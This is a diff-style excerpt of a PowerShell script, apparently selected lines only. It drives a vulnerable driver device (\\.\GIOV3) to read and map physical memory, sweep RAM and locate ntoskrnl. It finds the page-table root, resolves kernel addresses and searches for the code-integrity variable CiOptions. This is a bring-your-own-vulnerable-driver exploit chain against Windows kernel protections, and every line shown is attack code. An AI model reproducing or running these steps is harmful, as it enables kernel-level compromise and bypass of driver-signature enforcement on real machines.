@@ -1,0 +1,32 @@
+231: $g = [IntPtr]::Zero
+232: $err = [P36Prov]::GdrvOpen([ref]$g)
+234: Log ("  G0 \\.\GIOV3 open ok handle=0x{0:x}" -f $g.ToInt64())
+235: $ref0 = [P36Prov]::GdrvRead($g, [uint64]0x1000, 32)
+237: Log ("  G0 read phys 0x2000 = {0}" -f ([P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x2000, 16))))
+282: $viaGdrv = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1010, 8))
+285: $restored = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1010, 8))
+324: $back = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
+326: $res = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
+353: $G = [uint64]0
+363: if ($sb -notmatch 'err=5') { $G = $b; break }
+365: Log ("  G base = 0x{0:x}" -f $G)
+369: if ($G -ne 0) { for ($v = 0L; $v -lt 0x10000000L; $v += 0x100000L) { $pas.Add([uint64]$v) } }
+382: $ra = [P36Prov]::MsIoRegionAt($G, $pa, [ref]$reg)
+388: $gref = [P36Prov]::Hex([P36Prov]::GdrvRead($g, $pa, 4))
+395: $bk = [P36Prov]::Hex([P36Prov]::GdrvRead($g, $pa, 4))
+398: $rs = [P36Prov]::Hex([P36Prov]::GdrvRead($g, $pa, 4))
+431: if ($g -ne [IntPtr]::Zero) {
+433: Log ("  0xC3502004 in{pa,size} pa=0x1000: {0}" -f ([P36Prov]::GdrvMapTry($g, [uint64]0x1000, [uint64]0x1000, [ref]$va, [ref]$e3)))
+437: $b3 = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 16))
+444: $bk3 = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1010, 8))
+446: $rs3 = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1010, 8))
+452: Log ("  0xC3502808 in{b,a,n} a=0x1000: {0}" -f ([P36Prov]::GdrvCopyTry($g, [uint64]0x1000, [uint64]0x2000, 8, [ref]$e3)))
+457: if ($g -ne [IntPtr]::Zero) {
+461: Log ("  ladder read 0x100000 okCount={0}" -f ([P36Prov]::SizeLadder($g, [uint64]0x100000, [ref]$rep0)))
+466: Log ("  sweep 0x100000..0x40000000 step 0x100000 okCount={0}" -f ([P36Prov]::SweepRead($g, [uint64]0x100000, [uint64]0x40000000, [uint64]0x100000, [ref]$rep1)))
+471: try { $r1 = [P36Prov]::ScanNtoskrnl($g, $ramTop, [uint64]0x40000000, [ref]$hits) }
+487: try { $r2 = [P36Prov]::FindPml4($g, $ramTop, $lim, [ref]$cr3, [ref]$notes) }
+495: try { $wok = [P36Prov]::Walk($g, $cr3, [uint64]0xFFFFF6FB7DBED000, [ref]$self) }
+504: try { $r3 = [P36Prov]::FindKernelVa($g, $cr3, $ntPhys, $ntSize, [ref]$ntVa) }
+513: try { $n = [P36Prov]::FindCiOptions($g, $cr3, $ntVa, $ntPhys, $ntSize, [ref]$rep) }
+549: if ($g -ne [IntPtr]::Zero) { [P36Prov]::CloseHandle2($g) | Out-Null }
